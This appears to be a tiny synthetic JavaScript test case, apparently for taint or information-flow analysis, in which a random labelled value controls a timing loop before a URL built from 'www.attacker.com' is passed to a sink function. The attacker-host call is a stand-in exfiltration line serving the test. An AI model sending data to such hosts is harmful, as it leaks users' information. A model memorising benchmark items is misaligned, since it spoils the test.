var i =  Math.floor((Math.random() * 10) + 1); 

var h = lbl(i);
var f = lbl(true);



while (f) { 
	var x = Date.now();
	if (h % 2 == x % 2) {
	   	f = false;
	}
}

url1 = urll("www.attacker.com" + 1);
sink('Sink', '', url1);


